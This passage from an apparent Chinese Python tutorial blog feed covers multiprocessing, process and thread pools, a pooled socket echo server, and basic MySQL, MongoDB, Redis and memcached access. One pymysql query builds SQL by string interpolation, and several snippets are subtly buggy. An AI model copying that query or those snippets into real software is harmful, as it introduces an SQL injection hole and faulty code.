主进程结束之后，子进程跟着结束（某子进程的生命周期随着主进程）</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span><span class="params">()</span>:</span></span><br><span class="line">    time.sleep(<span class="number">20</span>)</span><br><span class="line">    print(<span class="string">"子进程结束"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    p = multiprocessing.Process(target=func, daemon = <span class="literal">True</span>)</span><br><span class="line">    p.daemon = <span class="literal">True</span>   <span class="comment"># 设置成守护进程 p True会随着主进程结束而结束， 主进程不会等待子进程结束</span></span><br><span class="line">    p.start()</span><br><span class="line">    time.sleep(<span class="number">3</span>)</span><br></pre></td></tr></table></figure><h6 id="终止进程"><a href="#终止进程" class="headerlink" title="终止进程"></a>终止进程</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 终止进程</span></span><br><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span><span class="params">()</span>:</span></span><br><span class="line">    time.sleep(<span class="number">5</span>)</span><br><span class="line">    print(multiprocessing.current_process())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    p = multiprocessing.Process(target=func)</span><br><span class="line">    p.start()</span><br><span class="line">    time.sleep(<span class="number">2</span>) <span class="comment"># 主进程2s</span></span><br><span class="line">    p.terminate()   <span class="comment"># 结束,主进程结束，不管子进程有没有结束，就终止子进程（线程没有这个）</span></span><br></pre></td></tr></table></figure><h6 id="面向对象"><a href="#面向对象" class="headerlink" title="面向对象"></a>面向对象</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 面向对象 类继承创建进程</span></span><br><span class="line"><span class="comment"># start() --&gt; run(已经是在新的进程了) --&gt; target   # target是由默认的run运行</span></span><br><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">My_Process</span><span class="params">(multiprocessing.Process)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, *args, **kwargs)</span>:</span></span><br><span class="line">        super().__init__(args, kwargs)</span><br><span class="line">        print(<span class="string">"初始化..."</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        start 默认调用的方法   重写啦在这里</span></span><br><span class="line"><span class="string">        :return:</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        print(<span class="string">"run..."</span>)</span><br><span class="line">        self.task()</span><br><span class="line">        time.sleep(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">task</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">"task..."</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    p = My_Process()</span><br><span class="line">    p.start()   <span class="comment"># start 方法会调用run</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建进程的方式 ： multiprocessing.Process     类继承，重写run     linux下：fork</span></span><br><span class="line"><span class="comment"># 如果换成是线程的话：换掉继承类就行</span></span><br></pre></td></tr></table></figure><h6 id="进程通信"><a href="#进程通信" class="headerlink" title="进程通信"></a>进程通信</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Manager  <span class="comment"># 管理器</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span><span class="params">(l)</span>:</span></span><br><span class="line">    l.append(<span class="number">111</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    manager = Manager()  <span class="comment"># 实例化  先开启一个公共进程，并返回一个管理器</span></span><br><span class="line">    l = manager.list()   <span class="comment"># 开启空间，左边就是代理</span></span><br><span class="line">    <span class="comment"># l = manager.dict()</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    一般常用的空间类型是：</span></span><br><span class="line"><span class="string">    1.  mgr.list()</span></span><br><span class="line"><span class="string">    2.  mgr.dict()</span></span><br><span class="line"><span class="string">    3.  mgr.Queue()</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    print(l)</span><br><span class="line">    p = multiprocessing.Process(target=func, args=(l,))</span><br><span class="line">    p.start()</span><br><span class="line">    p.join()</span><br><span class="line">    print(l)   <span class="comment"># 这样使用manager之后 l就是【共享】的了</span></span><br></pre></td></tr></table></figure><p>进程池 &amp; 线程池</p><p>ps:有点乱</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># from multiprocessing import Pool   # 进程池</span></span><br><span class="line"><span class="keyword">from</span> multiprocessing.dummy <span class="keyword">import</span> Pool  <span class="comment">#线程池</span></span><br><span class="line"><span class="keyword">from</span> multiprocessing.pool <span class="keyword">import</span> ThreadPool <span class="comment"># 线程池</span></span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span><span class="params">(i)</span>:</span></span><br><span class="line">    print(<span class="string">"&#123;&#125;-------555"</span>.format(i))</span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> i</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_back</span><span class="params">(*args, **kwargs)</span>:</span></span><br><span class="line">    print(<span class="string">"处理数据完成"</span>,args, kwargs)</span><br><span class="line"></span><br><span class="line">pool = Pool(<span class="number">6</span>)   <span class="comment"># 不写的话 默认是cpu的个数</span></span><br><span class="line"><span class="comment"># print(threading.active_count())</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">    pool.apply_async(func=func, args=(i,), callback=print_back)  <span class="comment">## 添加任务   不阻塞    主要使用的方法</span></span><br><span class="line"><span class="comment">#     pool.apply(func=func, )  ## 添加任务   阻塞</span></span><br><span class="line"><span class="comment"># pool.map(func, [i for i in range(5)])   #添加任务  不阻塞</span></span><br><span class="line"></span><br><span class="line">pool.close()   <span class="comment">#关闭线程池  不在提交新的任务</span></span><br><span class="line">pool.join()    <span class="comment">#等待进程池中的任务执行完毕</span></span><br><span class="line">print(<span class="string">"任务结束"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">########### 线程池的步骤</span></span><br><span class="line">p = ThreadPool(<span class="number">3</span>) <span class="comment"># 实例化</span></span><br><span class="line">p.apply_async(func) <span class="comment"># 函数      # 可以将返回值.get() 但是get也会i阻塞</span></span><br><span class="line">p.close()</span><br><span class="line">p.join()   <span class="comment"># join()语句要放在close()语句后面</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 进程池比线程池耗费资源</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 可以将返回值.get() 但是get也会i阻塞</span></span><br><span class="line">async_result = p.apply_async(func) <span class="comment"># 函数</span></span><br><span class="line">print(async_result.get())</span><br></pre></td></tr></table></figure><h6 id="使用进程池来实现并发服务器"><a href="#使用进程池来实现并发服务器" class="headerlink" title="使用进程池来实现并发服务器"></a>使用进程池来实现并发服务器</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用池来实现并发服务器</span></span><br><span class="line"><span class="comment"># 先开一个进程池， 每个进程下面再开一个线程</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Pool, cpu_count</span><br><span class="line"><span class="keyword">from</span> multiprocessing.pool <span class="keyword">import</span> ThreadPool</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">woeker_thread</span><span class="params">(conn)</span>:</span>  <span class="comment"># 使用线程池来</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        recv_data =conn.recv(<span class="number">1000</span>)</span><br><span class="line">        <span class="keyword">if</span> recv_data:</span><br><span class="line">            print(recv_data)</span><br><span class="line">            conn.send(recv_data)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            conn.close()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">worker_process</span><span class="params">(server)</span>:</span> <span class="comment"># 使用进程池来接收套接字</span></span><br><span class="line">    <span class="comment"># pool = Pool(cpu_count()*2)     # 通常可以分配2倍的cpu个数</span></span><br><span class="line">    pool = ThreadPool(cpu_count()) <span class="comment"># 获取电脑核心数</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        conn, addr = server.accept()</span><br><span class="line">        pool.apply_async(woeker_thread, args=(conn,))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    server = socket.socket()</span><br><span class="line">    server.bind((<span class="string">'127.0.0.1'</span>, <span class="number">8888</span>))</span><br><span class="line">    server.listen(<span class="number">1000</span>)</span><br><span class="line">    n = cpu_count()  <span class="comment"># 获得当前计算机的cpu核心数量</span></span><br><span class="line">    pool = Pool(n)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(n):  <span class="comment"># 充分利用cpu，为每个cpu分配一个进程</span></span><br><span class="line">        <span class="comment"># conn, addr = server.accept()</span></span><br><span class="line">        pool.apply_async(func=worker_process, args=(server,))</span><br><span class="line">        pool.apply_async(func=worker_process, args=(server,))</span><br><span class="line">    pool.close()</span><br><span class="line">    pool.join()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;并发：&lt;/strong&gt;   任务数大于cpu个数&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;并行：&lt;/strong&gt;    cpu个数和任务数相同&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;GIL 锁:&lt;/strong&gt;   任何python进程中，一次永远只有一个线程运行&lt;/p
      
    
    </summary>
    
      <category term="Python" scheme="http://www.xpshuai.cn/categories/Python/"/>
    
    
      <category term="Python" scheme="http://www.xpshuai.cn/tags/Python/"/>
    
      <category term="进程" scheme="http://www.xpshuai.cn/tags/%E8%BF%9B%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>python-数据库编程</title>
    <link href="http://www.xpshuai.cn/python-%E6%95%B0%E6%8D%AE%E5%BA%93%E7%BC%96%E7%A8%8B/"/>
    <id>http://www.xpshuai.cn/python-数据库编程/</id>
    <published>2020-02-24T06:01:04.000Z</published>
    <updated>2020-02-24T07:00:26.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Python-DBA-API"><a href="#Python-DBA-API" class="headerlink" title="Python DBA API"></a>Python DBA API</h2><h6 id="包含的内容"><a href="#包含的内容" class="headerlink" title="包含的内容"></a>包含的内容</h6><p><img src="/python-数据库编程/1.png"></p><h6 id="访问数据库流程"><a href="#访问数据库流程" class="headerlink" title="访问数据库流程"></a>访问数据库流程</h6><p><img src="/python-数据库编程/2.png"></p><h4 id="与MySQL"><a href="#与MySQL" class="headerlink" title="与MySQL"></a>与MySQL</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pymysql</span><br><span class="line"></span><br><span class="line">db_config = &#123;</span><br><span class="line">    <span class="string">'host'</span>: <span class="string">'127.0.0.1'</span>,</span><br><span class="line">    <span class="string">'user'</span>: <span class="string">'hhh'</span>,</span><br><span class="line">    <span class="string">'password'</span>: <span class="string">'123'</span>,</span><br><span class="line">    <span class="string">'db'</span>: <span class="string">'test'</span>,</span><br><span class="line">    <span class="string">'charset'</span>: <span class="string">'utf8'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 插入</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    conn = pymysql.connect(**db_config)</span><br><span class="line">    cursor = conn.cursor()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 插入</span></span><br><span class="line">    id = <span class="string">'2018002'</span></span><br><span class="line">    name =  <span class="string">'admin'</span></span><br><span class="line">    age = <span class="number">18</span></span><br><span class="line">    <span class="comment"># insert into student values(id,name,age)</span></span><br><span class="line">    sql = <span class="string">'insert into student(id, name, age) values(%s,%s,%s)'</span></span><br><span class="line">    cursor.execute(sql, (id, name, age))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 删除</span></span><br><span class="line">    <span class="comment"># table = 'students'</span></span><br><span class="line">    <span class="comment"># condittion = 'age &gt; 20'</span></span><br><span class="line">    <span class="comment"># sql = 'delete from &#123;table&#125; where &#123;condittion&#125;'.format(table=table, condittion=condittion)</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 查询</span></span><br><span class="line">    sql = <span class="string">"SELECT password FROM admin WHERE name='%s'"</span> % (name)</span><br><span class="line">    cursor.execute(sql)</span><br><span class="line">    pws = cursor.fetchall()</span><br><span class="line">   </span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    print(<span class="string">'error'</span>)</span><br><span class="line">    conn.rollback()</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    conn.commit() <span class="comment"># 数据有变动一定记得提交/双保险</span></span><br><span class="line">    cursor.close()</span><br><span class="line">    conn.close()</span><br></pre></td></tr></table></figure><h6 id="cursor对象支持的方法"><a href="#cursor对象支持的方法" class="headerlink" title="cursor对象支持的方法"></a>cursor对象支持的方法</h6><p><img src="/python-数据库编程/3.png"></p><h4 id="与MongoDB"><a href="#与MongoDB" class="headerlink" title="与MongoDB"></a>与MongoDB</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pymongo <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#建立连接</span></span><br><span class="line">client = MongoClient(<span class="string">'127.0.0.1'</span>,<span class="number">27017</span>)</span><br><span class="line"><span class="comment">#指定数据库</span></span><br><span class="line">db = client.test</span><br><span class="line"><span class="comment">#指定集合</span></span><br><span class="line">collection = db.col</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(type(collection),collection)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># python连接mongodb就搞定</span></span><br><span class="line">mydict =&#123;</span><br><span class="line">    <span class="string">'_id'</span>: <span class="number">6</span>,</span><br><span class="line">    <span class="string">'name'</span>: <span class="string">'admin'</span>,</span><br><span class="line">    <span class="string">'age'</span>: <span class="number">18</span>,</span><br><span class="line">    <span class="string">'addr'</span>: <span class="string">'didu'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># collection.insert(mydict)</span></span><br><span class="line"><span class="comment"># print(collection.find())</span></span><br><span class="line"><span class="comment"># for i in collection.find():</span></span><br><span class="line"><span class="comment">#     print(i)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># for i in collection.find(&#123;'name':'zhanglinlin'&#125;):</span></span><br><span class="line"><span class="comment">#     print(i)</span></span><br><span class="line"></span><br><span class="line">collection.update(&#123;<span class="string">'name'</span>:<span class="string">'zhanglinlin'</span>&#125;,&#123;<span class="string">'$set'</span>:&#123;<span class="string">'age'</span>:<span class="number">22</span>&#125;&#125;,&#123;<span class="string">'mult'</span>:<span class="string">'true'</span>&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># collection.remove()</span></span><br></pre></td></tr></table></figure><h4 id="与redis"><a href="#与redis" class="headerlink" title="与redis"></a>与redis</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> redis</span><br><span class="line"></span><br><span class="line"><span class="comment"># # 连接,给定参数ip/port， redis默认端口6379</span></span><br><span class="line">r = redis.Redis(host=<span class="string">'127.0.0.1'</span>, port=<span class="string">'6379'</span>)</span><br><span class="line"><span class="comment"># # print(type(r),r)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># # 设置键值对</span></span><br><span class="line">r.set(<span class="string">'name'</span>, <span class="string">'admin'</span>)</span><br><span class="line"><span class="comment"># # 获取该键的值</span></span><br><span class="line">str = r.get(<span class="string">'name'</span>)</span><br><span class="line">print(str.decode(<span class="string">'utf-8'</span>)) <span class="comment"># 解码</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 自动解码 参数：decode_responses=True</span></span><br><span class="line">r = redis.Redis(host=<span class="string">'127.0.0.1'</span>,port=<span class="string">'6379'</span>,decode_responses=<span class="literal">True</span>)</span><br><span class="line">r.set(<span class="string">'name'</span>,<span class="string">'哈哈'</span>)</span><br><span class="line">str = r.get(<span class="string">'name'</span>)</span><br><span class="line">print(str)</span><br><span class="line"></span><br><span class="line"><span class="comment">## StrictRedis</span></span><br><span class="line">r = redis.StrictRedis(host=<span class="string">'127.0.0.1'</span>,port=<span class="string">'6379'</span>)</span><br><span class="line">r.set(<span class="string">'name'</span>,<span class="string">'哈哈'</span>)</span><br><span class="line">str = r.get(<span class="string">'name'</span>)</span><br><span class="line">print(str,str.decode(<span class="string">'utf-8'</span>))</span><br><span class="line"><span class="comment">## `Redis`和`StrictRedis`区别：Redis兼容旧版本python2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">k_v = &#123;</span><br><span class="line">    <span class="string">'a1'</span>:<span class="string">'a'</span>,</span><br><span class="line">    <span class="string">'a2'</span>:<span class="string">'b'</span>,</span><br><span class="line">    <span class="string">'a3'</span>:<span class="string">'c'</span></span><br><span class="line">&#125;</span><br><span class="line">r = redis.StrictRedis(host=<span class="string">'127.0.0.1'</span>,port=<span class="string">'6379'</span>)</span><br><span class="line"><span class="comment"># 批量设置值</span></span><br><span class="line">r.mset(**k_v)</span><br><span class="line"><span class="comment"># 批量取值</span></span><br><span class="line">print(r.mget(<span class="string">'a1'</span>,<span class="string">'a2'</span>,<span class="string">'a3'</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">r = redis.StrictRedis(host=<span class="string">'127.0.0.1'</span>,port=<span class="string">'6379'</span>)</span><br><span class="line"><span class="comment"># 往列表添加值从头部开始</span></span><br><span class="line">r.lpush(<span class="string">'list1'</span>,<span class="string">'haha'</span>)</span><br><span class="line">r.lpush(<span class="string">'list1'</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>)</span><br><span class="line"><span class="comment"># 获取列表值</span></span><br><span class="line">print(r.lrange(<span class="string">'list1'</span>,<span class="number">0</span>,<span class="number">-1</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">r = redis.StrictRedis(host=<span class="string">'127.0.0.1'</span>,port=<span class="string">'6379'</span>)</span><br><span class="line">r.sadd(<span class="string">'set1'</span>,<span class="string">'aa'</span>)</span><br><span class="line">r.sadd(<span class="string">'set2'</span>,<span class="string">'aa'</span>,<span class="number">8</span>,<span class="number">10</span>,<span class="string">'bb'</span>)</span><br><span class="line">print(r.smembers(<span class="string">'set2'</span>))</span><br></pre></td></tr></table></figure><h4 id="与memcached"><a href="#与memcached" class="headerlink" title="与memcached"></a>与memcached</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> memcache</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 建立连接</span></span><br><span class="line">mc = memcache.Client([<span class="string">'127.0.0.1:11211'</span>], debug=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置一个</span></span><br><span class="line">mc.set(<span class="string">'name'</span>, <span class="string">'xps'</span>,time=<span class="number">60</span>)</span><br><span class="line"><span class="comment"># 设置多个</span></span><br><span class="line">mc.set_multi(&#123;<span class="string">"username"</span>:<span class="string">"handsome"</span>, <span class="string">"gender"</span>:<span class="string">"man"</span>&#125;, time=<span class="number">60</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取一个</span></span><br><span class="line">mc.get(<span class="string">'age'</span>)</span><br><span class="line"><span class="comment"># 获取多个</span></span><br><span class="line"><span class="comment"># 不管是元组还是列表都行，只要可迭代就行</span></span><br><span class="line">res1 = mc.get_multi((<span class="string">"username"</span>, <span class="string">"gender"</span>))</span><br><span class="line">res2 = mc.get_multi([<span class="string">"username"</span>, <span class="string">"gender"</span>])</span><br><span class="line"></span><br><span class="line">print(res1)</span><br><span class="line">print(res2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除一个</span></span><br><span class="line">mc.delete(<span class="string">"key"</span>)</span><br><span class="line"><span class="comment"># 删除多个</span></span><br><span class="line">mc.delete_multi([<span class="string">"key1"</span>, <span class="string">"key2"</span>])</span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string"># 0表示永不过期  断电就会完蛋   适合做验证码</span></span><br><span class="line"><span class="string"># prepend 前插</span></span><br><span class="line"><span class="string"># append  后插</span></span><br><span class="line"><span class="string"># telnet ip port 远程连接</span></span><br><span class="line"><span class="string">"""</span></span><br></pre></td></tr></table></figure><p>这里仅仅做了简单的介绍，具体还需要自己练习中学习</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Python-DBA-API&quot;&gt;&lt;a href=&quot;#Python-DBA-API&quot; class=&quot;headerlink&quot; title=&quot;Python DBA API&quot;&gt;&lt;/a&gt;Python DBA API&lt;/h2&gt;&lt;h6 id=&quot;包含的内容&quot;&gt;&lt;a href=&quot;#
      
    
    </summary>
    
      <category term="Python" scheme="http://www.xpshuai.cn/categories/Python/"/>
    
    
      <category term="Python" scheme="http://www.xpshuai.cn/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>python-多线程</title>
    <link href="http://www.xpshuai.cn/python-%E5%A4%9A%E7%BA%BF%E7%A8%8B/"/>
    <id>http://www.xpshuai.cn/python-多线程/</id>
    <published>2020-02-24T03:29:58.000Z</published>
    <updated>2020-02-24T07:00:26.000Z</updated>
    
